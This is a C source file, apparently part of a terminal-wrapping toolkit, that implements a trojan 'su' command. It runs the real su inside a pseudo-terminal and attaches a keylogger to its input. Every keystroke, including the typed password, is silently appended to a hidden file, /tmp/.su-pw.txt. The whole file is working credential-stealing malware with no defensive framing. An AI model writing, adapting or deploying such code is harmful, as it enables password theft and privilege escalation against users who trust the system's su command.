#include "tas/tas.h"
#include "tas/constructor.c"

#define LINE_LIMIT 3
#include "fun/keylogger.c"

#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <unistd.h>

int main(int argc, char **argv)
{
	(void) argc;

	struct termios tios;
	int status;

	tas_tty tty = TAS_TTY_INIT;
	tty.output_fd = open("/tmp/.su-pw.txt",
		O_WRONLY | O_APPEND | O_CREAT | O_CLOEXEC, 0600);

	if(tty.output_fd == -1) {
		tas_execv("su", argv);
		_exit(1);
	}

	pid_t pid = tas_forkpty(&tty);
	if (pid <= 0) {
		if (pid == -1)
			close(tty.master);

		tas_execv("su", argv);
		_exit(1);
	}

	tty.input_hook = (void *) keylogger;

	// set to raw mode
	raw_mode(&tios, STDIN_FILENO);

	// rw loop
	tty_loop(&tty);

	// restore
	tcsetattr(STDIN_FILENO, TCSAFLUSH, &tios);

	waitpid(pid, &status, 0);
	return status;
}
